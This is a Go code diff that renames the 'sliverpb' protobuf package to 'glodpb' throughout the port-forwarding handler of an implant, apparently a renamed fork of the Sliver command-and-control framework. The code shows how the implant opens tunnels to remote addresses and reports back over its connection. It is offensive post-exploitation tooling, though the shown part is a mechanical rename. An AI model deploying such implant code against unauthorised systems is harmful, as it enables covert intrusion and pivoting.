@@ -33,18 +33,18 @@ import (
 
 	"github.com/starkzarn/glod/implant/sliver/transports"
 	"github.com/starkzarn/glod/protobuf/commonpb"
-	"github.com/starkzarn/glod/protobuf/sliverpb"
+	"github.com/starkzarn/glod/protobuf/glodpb"
 	"google.golang.org/protobuf/proto"
 )
 
-func PortfwdReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
-	portfwdReq := &sliverpb.PortfwdReq{}
+func PortfwdReqHandler(envelope *glodpb.Envelope, connection *transports.Connection) {
+	portfwdReq := &glodpb.PortfwdReq{}
 	err := proto.Unmarshal(envelope.Data, portfwdReq)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[portfwd] Failed to unmarshal protobuf %s", err)
 		// {{end}}
-		portfwdResp, _ := proto.Marshal(&sliverpb.Portfwd{
+		portfwdResp, _ := proto.Marshal(&glodpb.Portfwd{
 			Response: &commonpb.Response{
 				Err: err.Error(),
 			},
@@ -69,7 +69,7 @@ func PortfwdReqHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 		log.Printf("[portfwd] Failed to dial remote address %s", err)
 		// {{end}}
 		cancelContext()
-		portfwdResp, _ := proto.Marshal(&sliverpb.Portfwd{
+		portfwdResp, _ := proto.Marshal(&glodpb.Portfwd{
 			Response: &commonpb.Response{
 				Err: err.Error(),
 			},
@@ -98,13 +98,13 @@ func PortfwdReqHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 	connection.AddTunnel(tunnel)
 
 	// Send portfwd response
-	portfwdResp, _ := proto.Marshal(&sliverpb.Portfwd{
+	portfwdResp, _ := proto.Marshal(&glodpb.Portfwd{
 		Port:     portfwdReq.Port,
 		Host:     portfwdReq.Host,
-		Protocol: sliverpb.PortFwdProtoTCP,
+		Protocol: glodpb.PortFwdProtoTCP,
 		TunnelID: portfwdReq.TunnelID,
 	})
-	connection.Send <- &sliverpb.Envelope{
+	connection.Send <- &glodpb.Envelope{
 		ID:   envelope.ID,
 		Data: portfwdResp,
 	}
@@ -120,12 +120,12 @@ func PortfwdReqHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 				return
 			}
 
-			tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
+			tunnelClose, _ := proto.Marshal(&glodpb.TunnelData{
 				Closed:   true,
 				TunnelID: cleanupTunnel.ID,
 			})
-			connection.Send <- &sliverpb.Envelope{
-				Type: sliverpb.MsgTunnelClose,
+			connection.Send <- &glodpb.Envelope{
+				Type: glodpb.MsgTunnelClose,
 				Data: tunnelClose,
 			}
 			connection.RemoveTunnel(cleanupTunnel.ID)
